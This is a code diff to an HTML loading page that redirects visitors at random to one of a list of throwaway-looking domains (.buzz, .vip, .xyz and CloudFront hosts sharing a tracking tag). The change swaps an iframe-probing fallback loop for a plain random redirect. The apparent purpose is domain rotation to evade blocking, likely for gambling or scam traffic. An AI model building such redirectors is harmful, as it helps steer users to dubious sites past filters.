@@ -38,68 +38,33 @@
 
     <img id="loadingImage" src="start_page.png" alt="Loading...">
 
-    <iframe id="testFrame"></iframe>
-
     <script>
         const urls = [
-            "https://www.xgtx6.vip?f=5005033",
-            "https://d3p075nnviqztu.cloudfront.net?f=5005033",
-            "https://d352cb5kjnw2gl.cloudfront.net?f=5005033",
-            "https://d336ckbzf1q0ly.cloudfront.net?f=5005033",
-            "https://d3orvci31z09kd.cloudfront.net?f=5005033",
-            "https://d3pcpjlmuzxzjm.cloudfront.net?f=5005033",
-            "https://d1qseh6m2qjcd3.cloudfront.net?f=5005033",
-            "https://d1cv01xvpwjf9o.cloudfront.net?f=5005033",
-            "https://d3mnoew5azypyl.cloudfront.net?f=5005033",
-            "https://j88v6.xyz?f=5005033",
-            "https://j88v7.xyz?f=5005033",
-            "https://j88v8.xyz?f=5005033",
-            "https://j88v0.xyz?f=5005033",
-            "https://q9r0s1.click?f=5005033"
+              "https://xgtx6.vip?f=5005033" ,
+              "https://k8s5zn.buzz?f=5005033" ,
+              "https://k8s5zn.buzz?f=5005033" ,
+              "https://www.pd7o3.vip?f=5005033" ,
+              "https://z6vn9l.buzz?f=5005033" ,
+              "https://x9l5dm.buzz?f=5005033" ,
+              "https://2bkm9q.buzz?f=5005033" ,
+              "https://3lmk9q.buzz?f=5005033" ,
+              "https://n9js5p.buzz?f=5005033" ,
+              "https://z7vk2m.buzz?f=5005033" ,
+              "https://t9j5nm.buzz?f=5005033" ,
+              "https://3nv7kl.buzz?f=5005033" ,
+              "https://9pm5sk.buzz?f=5005033" ,
         ];
 
-        const testFrame = document.getElementById('testFrame');
         const loadingImage = document.getElementById('loadingImage');
-        const timeoutDuration = 5000;
-        let checkedUrls = new Set();
-        function checkRandomUrl() {
-            if (checkedUrls.size === urls.length) {
-                loadingImage.style.display = 'none';
-                console.log('No accessible URLs found.');
-                return;
-            }
 
-            let randomIndex;
-            do {
-                randomIndex = Math.floor(Math.random() * urls.length);
-            } while (checkedUrls.has(randomIndex));
-
-            const url = urls[randomIndex];
-            checkedUrls.add(randomIndex);
-
-            console.log(`Checking: ${url}`);
-
-            let loadTimeout = setTimeout(() => {
-                console.error(`Timeout loading ${url}`);
-                checkRandomUrl();
-            }, timeoutDuration);
-
-            testFrame.onload = function() {
-                clearTimeout(loadTimeout); 
-                loadingImage.style.display = 'none';
-                window.location.href = url;
-            };
-
-            testFrame.onerror = function() {
-                clearTimeout(loadTimeout);
-                console.error(`Failed to load ${url}`);
-                checkRandomUrl();
-            };
-
-            testFrame.src = url;    
+        function getRandomUrl() {
+          const randomIndex = Math.floor(Math.random() * urls.length);
+          const selectedUrl = urls[randomIndex];
+          return selectedUrl;
         }
-
-        checkRandomUrl();
+        const randomUrl = getRandomUrl();
+        loadingImage.style.display = 'none';
+        window.location.href = randomUrl;
     </script>
 
 </body>
